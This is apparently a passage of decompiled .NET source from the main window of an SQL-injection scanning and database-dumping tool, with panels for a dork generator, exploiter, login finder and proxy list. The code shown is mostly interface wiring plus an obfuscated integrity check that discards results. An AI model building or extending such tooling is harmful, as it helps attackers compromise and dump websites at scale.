						Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init, new StaticLocalInitFlag(), null);
					}
					bool flag2 = false;
					try
					{
						Monitor.Enter(this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init, ref flag2);
						if (this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init.State == 0)
						{
							this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init.State = 2;
							this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks = 1;
						}
						else if (this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init.State == 2)
						{
							throw new IncompleteInitialization();
						}
					}
					finally
					{
						this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init.State = 1;
						if (flag2)
						{
							Monitor.Exit(this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks$Init);
						}
					}
					if (!this.$STATIC$HandleTimerBackground$20211C12819D$called)
					{
						this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks++;
						Random random = new Random();
						int num3 = random.Next(180, 600);
						if (this.$STATIC$HandleTimerBackground$20211C12819D$called_tricks % num3 == 0)
						{
							char[] array4 = "7_DOHTEMS".ToCharArray();
							Array.Reverse(array4);
							string text2 = new string(array4);
							string text3 = Conversions.ToString(Versioned.CallByName(this, text2.ToLower(), CallType.Method, new object[]
							{
								0
							}));
							if ((string.IsNullOrEmpty(text3) || !text3.ToLower().Contains("uclng")) | global::Globals.G_DataGP == null)
							{
								global::Globals.DG_SQLi = null;
								global::Globals.DG_SQLiNoInjectable = null;
								global::Globals.DG_FileInclusao = null;
							}
							else
							{
								this.$STATIC$HandleTimerBackground$20211C12819D$called = true;
							}
						}
					}
				}
			}
		}
	}

	// Token: 0x06000EDE RID: 3806 RVA: 0x00062B90 File Offset: 0x00060D90
	private static double smethod_11(double[] double_0)
	{
		double num = 0.0;
		double result = 0.0;
		checked
		{
			int num2 = double_0.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				unchecked
				{
					num += double_0[i];
				}
			}
			if (double_0.Length > 0)
			{
				result = num / Convert.ToDouble(double_0.Length);
			}
			return result;
		}
	}

	// Token: 0x06000EDF RID: 3807 RVA: 0x00008199 File Offset: 0x00006399
	private void method_53(object sender, TreeNodeMouseClickEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			this.twMain.SelectedNode = e.Node;
		}
	}

	// Token: 0x06000EE0 RID: 3808 RVA: 0x00062BE4 File Offset: 0x00060DE4
	private void method_54(object object_0, object object_1)
	{
		int num3;
		int num5;
		object obj;
		try
		{
			IL_02:
			int num = 1;
			if (this.mdiTabControl == null)
			{
				goto IL_1C4;
			}
			IL_12:
			num = 3;
			if (this.enum6_0 != MainForm.Enum6.const_0)
			{
				goto IL_180;
			}
			IL_22:
			num = 4;
			int num2 = this.mdiTabControl.SelectedIndex();
			if (num2 == 0)
			{
				goto IL_47;
			}
			IL_33:
			num = 24;
			this.tsWorker.Visible = false;
			goto IL_180;
			IL_47:
			num = 6;
			this.tsWorker.Visible = true;
			IL_55:
			num = 7;
			this.numThreads.Tag = null;
			IL_63:
			ProjectData.ClearProjectError();
			num3 = -2;
			IL_6B:
			num = 9;
			if (this.uxTabControl_0.SelectedIndex != 0)
			{
				goto IL_C1;
			}
			IL_7E:
			num = 10;
			this.btnStart.Text = global::Globals.translate_0.GetStr(this, 109, "");
			IL_9E:
			num = 11;
			this.numThreads.Visible = false;
			IL_AD:
			num = 12;
			this.toolStripLabel_1.Visible = false;
			goto IL_16C;
			IL_C1:
			num = 14;
			if (!(this.uxTabControl_0.SelectedIndex == 1 | this.uxTabControl_0.SelectedIndex == 2))
			{
				goto IL_16C;
			}
			IL_E6:
			num = 15;
			this.btnStart.Text = global::Globals.translate_0.GetStr(this, 110, "");
			IL_106:
			num = 16;
			this.numThreads.Increment = 10m;
			IL_11C:
			num = 17;
			this.numThreads.Maximum = 300m;
			IL_135:
			num = 18;
			this.numThreads.Value = new decimal(this.int_2);
			IL_14E:
			num = 19;
			this.numThreads.Visible = true;
			IL_15D:
			num = 20;
			this.toolStripLabel_1.Visible = true;
			IL_16C:
			num = 22;
			this.numThreads.Tag = true;
			IL_180:
			num = 27;
			if (this.mdiTabControl.SelectedIndex() != 5 || this.uxTabControl_1.SelectedIndex != checked(this.uxTabControl_1.TabCount - 1))
			{
				goto IL_1BB;
			}
			IL_1B0:
			num = 28;
			this.method_67();
			goto IL_1C4;
			IL_1BB:
			num = 30;
			this.method_68();
			IL_1C4:
			goto IL_29E;
			IL_1C9:
			int num4 = num5 + 1;
			num5 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
			IL_257:
			goto IL_293;
			IL_259:
			num5 = num;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num3 > -2) ? num3 : 1);
			IL_271:;
		}
		catch when (endfilter(obj is Exception & num3 != 0 & num5 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_259;
		}
		IL_293:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_29E:
		if (num5 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000EE1 RID: 3809 RVA: 0x00062EB4 File Offset: 0x000610B4
	private void uxTabControl_0_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (this.uxTabControl_0.SelectedIndex)
		{
		case 0:
			this.dtgQueue.Focus();
			break;
		case 1:
			this.dtgSQLi.Focus();
			break;
		case 2:
			this.dtgFileInclusao.Focus();
			break;
		case 3:
			this.dtgSQLiNoInjectable.Focus();
			break;
		case 4:
			this.dtgTrash.Focus();
			break;
		}
		this.method_54(null, null);
	}

	// Token: 0x06000EE2 RID: 3810 RVA: 0x000081BB File Offset: 0x000063BB
	private void uxTabControl_1_SelectedIndexChanged(object sender, EventArgs e)
	{
		this.method_54(null, null);
	}

	// Token: 0x06000EE3 RID: 3811 RVA: 0x00062F38 File Offset: 0x00061138
	private void smethod_6(object sender, TreeViewEventArgs e)
	{
		int num2;
		int num4;
		object obj;
		try
		{
			IL_02:
			int num = 1;
			if (!this.bool_3)
			{
				goto IL_1B;
			}
			IL_0C:
			num = 2;
			this.method_54(null, null);
			goto IL_66A;
			IL_1B:
			num = 5;
			global::Globals.LockWindowUpdate(this.pnlWindows.Handle);
			IL_2E:
			num = 6;
			if (Information.IsNothing(this.twMain.SelectedNode))
			{
				goto IL_66A;
			}
			IL_45:
			num = 9;
			if (!Information.IsNothing(e))
			{
				goto IL_67;
			}
			IL_50:
			num = 10;
			e = new TreeViewEventArgs(this.twMain.SelectedNode);
			IL_67:
			num = 12;
			this.pnlScanner.Visible = false;
			IL_76:
			num = 13;
			this.pnlSQLi.Visible = false;
			IL_85:
			num = 14;
			this.pnlSQLiNoInjectable.Visible = false;
			IL_94:
			num = 15;
			this.pnlSQLiDumper.Visible = false;
			IL_A3:
			num = 16;
			this.pnlExploiter.Visible = false;
			IL_B2:
			num = 17;
			this.pnlAnalizer.Visible = false;
			IL_C1:
			num = 18;
			this.pnlTrash.Visible = false;
			IL_D0:
			num = 19;
			this.pnlSockList.Visible = false;
			IL_DF:
			num = 20;
			this.pnlTools.Visible = false;
			IL_EE:
			num = 21;
			this.pnlDorkGenerator.Visible = false;
			IL_FD:
			num = 22;
			this.pnlLoginFinder.Visible = false;
			IL_10C:
			num = 23;
			this.pnlNotepad.Visible = false;
			IL_11B:
			num = 24;
			this.pnlSettings.Visible = false;
			IL_12A:
			num = 25;
			this.pnlSettingsAdvanced.Visible = false;
			IL_139:
			num = 26;
			this.pnlStatistics.Visible = false;
			IL_148:
			num = 27;
			this.pnlAbout.Visible = false;
			IL_157:
			num = 28;
			string text = e.Node.Text;
			IL_166:
			num = 30;
			if (Operators.CompareString(text, this.treeNode_0.Text, false) != 0)
			{
				goto IL_194;
			}
			IL_180:
			num = 31;
			this.pnlScanner.Visible = true;
			goto IL_44D;
			IL_194:
			num = 33;
			if (Operators.CompareString(text, this.treeNode_9.Text, false) != 0)
			{
				goto IL_1C2;
			}
			IL_1AE:
			num = 34;
			this.pnlDorkGenerator.Visible = true;
			goto IL_44D;
			IL_1C2:
			num = 36;
			if (Operators.CompareString(text, this.treeNode_1.Text, false) != 0)
			{
				goto IL_1F0;
			}
			IL_1DC:
			num = 37;
			this.pnlSQLi.Visible = true;
			goto IL_44D;
			IL_1F0:
			num = 39;
			if (Operators.CompareString(text, this.treeNode_2.Text, false) != 0)
			{
				goto IL_21E;
			}
			IL_20A:
			num = 40;
			this.pnlSQLiNoInjectable.Visible = true;
			goto IL_44D;
			IL_21E:
			num = 42;
			if (Operators.CompareString(text, this.treeNode_3.Text, false) != 0)
			{
				goto IL_24C;
			}
			IL_238:
			num = 43;
			this.pnlSQLiDumper.Visible = true;
			goto IL_44D;
			IL_24C:
			num = 45;
			if (Operators.CompareString(text, this.treeNode_4.Text, false) != 0)
			{
				goto IL_27A;
			}
			IL_266:
			num = 46;
			this.pnlExploiter.Visible = true;
			goto IL_44D;
			IL_27A:
			num = 48;
			if (Operators.CompareString(text, this.treeNode_5.Text, false) != 0)
			{
				goto IL_2A8;
			}
			IL_294:
			num = 49;
			this.pnlAnalizer.Visible = true;
			goto IL_44D;
			IL_2A8:
			num = 51;
			if (Operators.CompareString(text, this.treeNode_6.Text, false) != 0)
			{
				goto IL_2D6;
			}
			IL_2C2:
			num = 52;
			this.pnlTrash.Visible = true;
			goto IL_44D;
			IL_2D6:
			num = 54;
			if (Operators.CompareString(text, this.treeNode_7.Text, false) != 0)
			{
				goto IL_304;
			}
			IL_2F0:
			num = 55;
			this.pnlSockList.Visible = true;
			goto IL_44D;
			IL_304:
			num = 57;
			if (Operators.CompareString(text, this.treeNode_8.Text, false) != 0)
			{
				goto IL_332;
			}
			IL_31E:
			num = 58;
			this.pnlTools.Visible = true;
			goto IL_44D;
			IL_332:
			num = 60;
			if (Operators.CompareString(text, this.treeNode_10.Text, false) != 0)
			{
				goto IL_360;
			}
			IL_34C:
			num = 61;
			this.pnlLoginFinder.Visible = true;
			goto IL_44D;
			IL_360:
			num = 63;
			if (Operators.CompareString(text, this.treeNode_11.Text, false) != 0)
			{
				goto IL_38E;
			}
			IL_37A:
			num = 64;
			this.pnlNotepad.Visible = true;
			goto IL_44D;
			IL_38E:
			num = 66;
			if (Operators.CompareString(text, this.treeNode_12.Text, false) != 0)
			{
				goto IL_3BC;
			}
			IL_3A8:
			num = 67;
			this.pnlSettings.Visible = true;
			goto IL_44D;
			IL_3BC:
			num = 69;
			if (Operators.CompareString(text, this.treeNode_13.Text, false) != 0)
			{
				goto IL_3E7;
			}
			IL_3D6:
			num = 70;
			this.pnlSettingsAdvanced.Visible = true;
			goto IL_44D;
			IL_3E7:
			num = 72;
			if (Operators.CompareString(text, this.treeNode_14.Text, false) != 0)
			{
				goto IL_412;
			}
			IL_401:
			num = 73;
			this.pnlStatistics.Visible = true;
			goto IL_44D;
			IL_412:
			num = 75;
			if (Operators.CompareString(text, this.treeNode_15.Text, false) != 0)
			{
				goto IL_43D;
			}
			IL_42C:
			num = 76;
			this.pnlAbout.Visible = true;
			goto IL_44D;
			IL_43D:
			num = 78;
			Interaction.MsgBox("twMain_AfterSelect", MsgBoxStyle.OkOnly, null);
			IL_44D:
			num = 79;
			if (!e.Node.Text.Equals(this.treeNode_15.Text))
			{
				goto IL_478;
			}
			IL_46D:
			num = 80;
			this.method_67();
			goto IL_481;
			IL_478:
			num = 82;
			this.method_68();
			IL_481:
			num = 84;
			if (this.enum6_0 != MainForm.Enum6.const_0)
			{
				goto IL_65C;
			}
			IL_492:
			num = 85;
			string text2 = e.Node.Text;
			IL_4A1:
			num = 87;
			if (Operators.CompareString(text2, this.treeNode_0.Text, false) != 0 && Operators.CompareString(text2, this.treeNode_4.Text, false) != 0 && Operators.CompareString(text2, this.treeNode_1.Text, false) != 0)
			{
				goto IL_64D;
			}
			IL_4E9:
			num = 88;
			this.tsWorker.Visible = true;
			IL_4F8:
			num = 89;
			this.numThreads.Tag = null;
			IL_507:
			ProjectData.ClearProjectError();
			num2 = -2;
			IL_50F:
			num = 91;
			if (!e.Node.Text.Equals(this.treeNode_0.Text))
			{
				goto IL_572;
			}
			IL_52F:
			num = 92;
			this.btnStart.Text = global::Globals.translate_0.GetStr(this, 109, "");
			IL_54F:
			num = 93;
			this.numThreads.Visible = false;
			IL_55E:
			num = 94;
			this.toolStripLabel_1.Visible = false;
			goto IL_637;
			IL_572:
			num = 96;
			if (!(e.Node.Text.Equals(this.treeNode_4.Text) | e.Node.Text.Equals(this.treeNode_1.Text)))
			{
				goto IL_637;
			}
			IL_5B1:
			num = 97;
			this.btnStart.Text = global::Globals.translate_0.GetStr(this, 110, "");
			IL_5D1:
			num = 98;
			this.numThreads.Increment = 10m;
			IL_5E7:
			num = 99;
			this.numThreads.Maximum = 300m;
			IL_600:
			num = 100;
			this.numThreads.Value = new decimal(this.int_2);
			IL_619:
			num = 101;
			this.numThreads.Visible = true;
			IL_628:
			num = 102;
			this.toolStripLabel_1.Visible = true;
			IL_637:
			num = 104;
			this.numThreads.Tag = true;
			goto IL_65C;
			IL_64D:
			num = 106;
			this.tsWorker.Visible = false;
			IL_65C:
			num = 108;
			global::Globals.LockWindowUpdate(IntPtr.Zero);
			IL_66A:
			goto IL_87C;
			IL_66F:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_833:
			goto IL_871;
			IL_835:
			num4 = num;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
			IL_84E:;
		}
		catch when (endfilter(obj is Exception & num2 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_835;
		}
		IL_871:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_87C:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000EE4 RID: 3812 RVA: 0x000081C5 File Offset: 0x000063C5
	private void method_55(TreeNode treeNode_16, int int_14)
	{
		treeNode_16.SelectedImageIndex = int_14;
		treeNode_16.ImageIndex = int_14;
	}

	// Token: 0x06000EE5 RID: 3813 RVA: 0x000637E8 File Offset: 0x000619E8
	private void method_56()
	{
		this.method_55(this.treeNode_0, 0);
		this.method_55(this.treeNode_9, 0);
		this.method_55(this.treeNode_1, 1);
		this.method_55(this.treeNode_2, 2);
		this.method_55(this.treeNode_3, 3);
		this.method_55(this.treeNode_4, 4);
		this.method_55(this.treeNode_5, 4);
		this.method_55(this.treeNode_6, 5);
		this.method_55(this.treeNode_7, 6);
		this.method_55(this.treeNode_8, 7);
		this.method_55(this.treeNode_10, 8);
		this.method_55(this.treeNode_11, 9);
		this.method_55(this.treeNode_12, 10);
		this.method_55(this.treeNode_13, 11);
		this.method_55(this.treeNode_14, 12);
		this.method_55(this.treeNode_15, 13);
		this.twMain.BeginUpdate();
		this.twMain.Nodes.Add(this.treeNode_0);
		this.twMain.Nodes.Add(this.treeNode_1);
		this.treeNode_1.Nodes.Add(this.treeNode_5);
		this.treeNode_1.Nodes.Add(this.treeNode_3);
		this.treeNode_1.Nodes.Add(this.treeNode_2);
		this.treeNode_1.ExpandAll();
		this.twMain.Nodes.Add(this.treeNode_4);
		this.treeNode_4.ExpandAll();
		this.twMain.Nodes.Add(this.treeNode_6);
		this.twMain.Nodes.Add(this.treeNode_7);
		this.twMain.Nodes.Add(this.treeNode_8);
		this.treeNode_8.Nodes.Add(this.treeNode_10);
		this.treeNode_8.Nodes.Add(this.treeNode_11);
		this.treeNode_8.Collapse();
		this.twMain.Nodes.Add(this.treeNode_12);
		this.treeNode_12.Nodes.Add(this.treeNode_13);
		this.treeNode_12.Nodes.Add(this.treeNode_14);
		this.treeNode_12.Nodes.Add(this.treeNode_15);
		this.treeNode_12.Collapse();
		this.twMain.ImageList = this.imlTree;
		this.twMain.EndUpdate();
	}

	// Token: 0x06000EE6 RID: 3814 RVA: 0x000081D5 File Offset: 0x000063D5
	private void method_57(Panel panel_0)
	{
		this.pnlControls.Controls.Add(panel_0);
		panel_0.Dock = DockStyle.Fill;
		panel_0.Visible = false;
		MainForm.SetDoubleBuffered(panel_0);
	}

	// Token: 0x06000EE7 RID: 3815 RVA: 0x00063A78 File Offset: 0x00061C78
	internal void method_58(bool bool_5 = true)
	{
		this.pnlAnalizer.AutoScroll = true;
		this.AnalizerForm = new Analizer();
		this.AnalizerForm.FormBorderStyle = FormBorderStyle.None;
		this.AnalizerForm.TopLevel = false;
		this.pnlAnalizer.Controls.Add(this.AnalizerForm);
		this.AnalizerForm.Dock = DockStyle.Fill;
		if (bool_5)
		{
			this.AnalizerForm.LoadSettings();
		}
		this.AnalizerForm.Show();
	}

	// Token: 0x06000EE8 RID: 3816 RVA: 0x00063AF0 File Offset: 0x00061CF0
	internal void method_59(bool bool_5 = true)
	{
		this.pnlLoginFinder.AutoScroll = true;
		this.LoginFinderForm = new LoginFinder();
		this.LoginFinderForm.FormBorderStyle = FormBorderStyle.None;
		this.LoginFinderForm.TopLevel = false;
		this.pnlLoginFinder.Controls.Add(this.LoginFinderForm);
		this.LoginFinderForm.Dock = DockStyle.Fill;
		if (bool_5)
		{
			this.LoginFinderForm.LoadSettings();
		}
		this.LoginFinderForm.Show();
	}

	// Token: 0x06000EE9 RID: 3817 RVA: 0x00063B68 File Offset: 0x00061D68
	internal void method_60(bool bool_5 = false)
	{
		this.pnlSQLiDumper.AutoScroll = true;
		this.DumperForm = new Dumper();
		this.DumperForm.FormBorderStyle = FormBorderStyle.None;
		this.DumperForm.TopLevel = false;
		this.pnlSQLiDumper.Controls.Add(this.DumperForm);
		this.DumperForm.Dock = DockStyle.Fill;
		this.DumperForm.Show();
		checked
		{
			if (!global::Globals.IS_DUMP_INSTANCE)
			{
				if (bool_5)
				{
					this.DumperForm.Focus();
				}
				else
				{
					this.DumperForm.method_75();
				}
			}
			else
			{
				this.pnlTree.Visible = false;
				this.toolStripButton_4.Checked = true;
				this.toolStripButton_4.Visible = false;
				this.pnlControls.Controls.Remove(this.pnlSockList);
				this.DumperForm.tpProxies.Controls.Add(this.pnlSockList);
				this.DumperForm.tpProxies.Text = global::Globals.translate_0.GetStr(this, 103, "");
				this.pnlSockList.Visible = true;
				string[] command_LINE_ARGS = global::Globals.COMMAND_LINE_ARGS;
				this.DumperForm.Text = Class23.smethod_11(command_LINE_ARGS[1]);
				this.DumperForm.txtURL.Text = command_LINE_ARGS[1];
				this.DumperForm.cmbSqlType.SelectedItem = command_LINE_ARGS[2];
				this.DumperForm.method_67(null, null);
				if (command_LINE_ARGS.Length > 2)
				{
					int num = command_LINE_ARGS.Length - 1;
					for (int i = 3; i <= num; i++)
					{
						string[] array = Strings.Split(command_LINE_ARGS[i], ".", -1, CompareMethod.Binary);
						if (array.Length == 2)
						{
							this.DumperForm.method_47(array[0]);
							this.DumperForm.method_48(array[0], array[1]);
						}
					}
				}
				this.Text = this.DumperForm.Text;
				if (this.DumperForm.trwSchema.Nodes.Count > 0)
				{
					this.DumperForm.trwSchema.SelectedNode = this.DumperForm.trwSchema.Nodes[0];
				}
				this.DumperForm.method_90(null, null);
			}
		}
	}

	// Token: 0x06000EEA RID: 3818 RVA: 0x000081FC File Offset: 0x000063FC
	internal void method_61(bool bool_5 = true)
	{
		this.pnlAnalizer.Controls.Remove(this.AnalizerForm);
		if (bool_5)
		{
			this.AnalizerForm.SaveSettings();
		}
		this.AnalizerForm.Close();
		this.AnalizerForm.Dispose();
	}

	// Token: 0x06000EEB RID: 3819 RVA: 0x00008238 File Offset: 0x00006438
	internal void method_62(bool bool_5 = true)
	{
		this.pnlLoginFinder.Controls.Remove(this.LoginFinderForm);
		if (bool_5)
		{
			this.LoginFinderForm.SaveSettings();
		}
		this.LoginFinderForm.Close();
		this.LoginFinderForm.Dispose();
	}

	// Token: 0x06000EEC RID: 3820 RVA: 0x00008274 File Offset: 0x00006474
	internal void method_63(bool bool_5 = false)
	{
		this.pnlSQLiDumper.Controls.Remove(this.DumperForm);
		if (!bool_5)
		{
			this.DumperForm.Close();
		}
		this.DumperForm.Dispose();
	}

	// Token: 0x06000EED RID: 3821 RVA: 0x00063D80 File Offset: 0x00061F80
	public void smethod_8()
	{
		global::Globals.G_Taskbar = new Manager(base.Handle);
		this.stMain.SendToBack();
		this.cmbGuiStyle.Items.AddRange(new string[]
		{
			"Tabs",
			"Tree"
		});
		this.cmbGuiStyle.Text = Class50.smethod_5(base.Name, this.cmbGuiStyle.Name, "Tabs", null);
		this.bool_3 = this.cmbGuiStyle.Text.Equals("Tabs");
		checked
		{
			if (global::Globals.IS_DUMP_INSTANCE)
			{
				MainForm.SetDoubleBuffered(this.pnlSQLiDumper);
				MainForm.SetDoubleBuffered(this.pnlSockList);
				this.pnlSockList.Dock = DockStyle.Fill;
				this.toolStripButton_4.Visible = false;
				this.tsWorker.Visible = false;
				this.bool_3 = false;
			}
			else
			{
				if (!this.bool_3)
				{
					this.treeNode_0 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 0, ""));
					this.treeNode_9 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 16, ""));
					this.treeNode_1 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 1, ""));
					this.treeNode_2 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 2, ""));
					this.treeNode_3 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 3, ""));
					this.treeNode_4 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 4, ""));
					this.treeNode_5 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 15, ""));
					this.treeNode_6 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 5, ""));
					this.treeNode_7 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 6, ""));
					this.treeNode_8 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 7, ""));
					this.treeNode_10 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 8, ""));
					this.treeNode_11 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 9, ""));
					this.treeNode_12 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 10, ""));
					this.treeNode_13 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 11, ""));
					this.treeNode_14 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 12, ""));
					this.treeNode_15 = new TreeNode(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 13, ""));
					if (global::Globals.translate_0.GetLanguage().Equals("English"))
					{
						this.pnlTree.Width = 200;
					}
					else
					{
						this.pnlTree.Width = 200;
					}
					MainForm.SetDoubleBuffered(this.pnlWindows);
					this.pnlWindows.Dock = DockStyle.Fill;
					this.method_57(this.pnlScanner);
					this.method_57(this.pnlSQLi);
					this.method_57(this.pnlSQLiNoInjectable);
					this.method_57(this.pnlSQLiDumper);
					this.method_57(this.pnlExploiter);
					this.method_57(this.pnlAnalizer);
					this.method_57(this.pnlTrash);
					this.method_57(this.pnlSockList);
					this.method_57(this.pnlTools);
					this.method_57(this.pnlDorkGenerator);
					this.method_57(this.pnlLoginFinder);
					this.method_57(this.pnlNotepad);
					this.method_57(this.pnlSettings);
					this.method_57(this.pnlSettingsAdvanced);
					this.method_57(this.pnlStatistics);
					this.method_57(this.pnlAbout);
					this.method_56();
					this.MinimumSize = new Size(650, 450);
				}
				else
				{
					this.pnlTree.Visible = false;
					this.pnlScanner.Visible = false;
					this.pnlSQLi.Visible = false;
					this.pnlSQLiNoInjectable.Visible = false;
					this.pnlSQLiDumper.Visible = false;
					this.pnlExploiter.Visible = false;
					this.pnlAnalizer.Visible = false;
					this.pnlTrash.Visible = false;
					this.pnlSockList.Visible = false;
					this.pnlTools.Visible = false;
					this.pnlDorkGenerator.Visible = false;
					this.pnlLoginFinder.Visible = false;
					this.pnlNotepad.Visible = false;
					this.pnlSettings.Visible = false;
					this.pnlSettingsAdvanced.Visible = false;
					this.pnlStatistics.Visible = false;
					this.pnlAbout.Visible = false;
					this.pnlTree.Visible = false;
					this.pnlWindows.Visible = false;
					this.pnlControls.Visible = false;
					this.mdiTabControl = new TabControlExt();
					base.Controls.Add(this.mdiTabControl);
					this.mdiTabControl.Dock = DockStyle.Fill;
					this.mdiTabControl.SendToBack();
					MainForm.SetDoubleBuffered(this.mdiTabControl);
					TabControlExt tabControlExt = this.mdiTabControl;
					this.toolStripButton_4.Visible = false;
					this.pnlScanner.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 0, "");
					this.pnlSQLi.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 1, "");
					this.pnlSQLiNoInjectable.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 2, "");
					this.pnlSQLiDumper.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 3, "");
					this.pnlExploiter.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 4, "");
					this.pnlAnalizer.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 15, "");
					this.pnlTrash.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 5, "");
					this.pnlSockList.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 6, "");
					this.pnlTools.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 7, "");
					this.pnlDorkGenerator.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 16, "");
					this.pnlLoginFinder.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 8, "");
					this.pnlNotepad.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 9, "");
					this.pnlSettings.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 10, "");
					this.pnlSettingsAdvanced.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 11, "");
					this.pnlStatistics.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 12, "");
					this.pnlAbout.Tag = global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 13, "");
					Panel panel = new Panel();
					UxTabControl uxTabControl = new UxTabControl();
					panel.Dock = DockStyle.Fill;
					uxTabControl.Dock = DockStyle.Fill;
					panel.Controls.Add(uxTabControl);
					panel.Name = Guid.NewGuid().ToString();
					uxTabControl.Name = Guid.NewGuid().ToString();
					this.uxTabControl_1 = uxTabControl;
					this.uxTabControl_1.ImageList = this.imlTree;
					this.uxTabControl_1.SelectedIndexChanged += this.uxTabControl_1_SelectedIndexChanged;
					TabPage tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 10, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlSettings);
					this.pnlSettings.Dock = DockStyle.Fill;
					this.pnlSettings.Visible = true;
					tabPage.ImageIndex = 16;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 11, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlSettingsAdvanced);
					this.pnlSettingsAdvanced.Dock = DockStyle.Fill;
					this.pnlSettingsAdvanced.Visible = true;
					tabPage.ImageIndex = 11;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 12, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlStatistics);
					this.pnlStatistics.Dock = DockStyle.Fill;
					this.pnlStatistics.Visible = true;
					tabPage.ImageIndex = 12;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 13, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlAbout);
					this.pnlAbout.Dock = DockStyle.Fill;
					this.pnlAbout.Visible = true;
					tabPage.ImageIndex = 13;
					tabControlExt.TabPages.Add(panel, global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 10, ""), (Bitmap)this.imlTree.Images[10]).CloseButtonVisible = false;
					panel = new Panel();
					uxTabControl = new UxTabControl();
					panel.Dock = DockStyle.Fill;
					uxTabControl.Dock = DockStyle.Fill;
					panel.Controls.Add(uxTabControl);
					panel.Name = Guid.NewGuid().ToString();
					uxTabControl.Name = Guid.NewGuid().ToString();
					uxTabControl.ImageList = this.imlTree;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 8, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlLoginFinder);
					this.pnlLoginFinder.Dock = DockStyle.Fill;
					this.pnlLoginFinder.Visible = true;
					tabPage.ImageIndex = 8;
					tabPage = new TabPage(global::Globals.translate_0.GetStr(base.Name + "." + this.twMain.Name, 18, ""));
					uxTabControl.TabPages.Add(tabPage);
					tabPage.Name = Guid.NewGuid().ToString();
					tabPage.Controls.Add(this.pnlTools);
					this.pnlTools.Dock = DockStyle.Fill;
					this.pnlTools.Visible = true;
					tabPage.ImageIndex = 15;
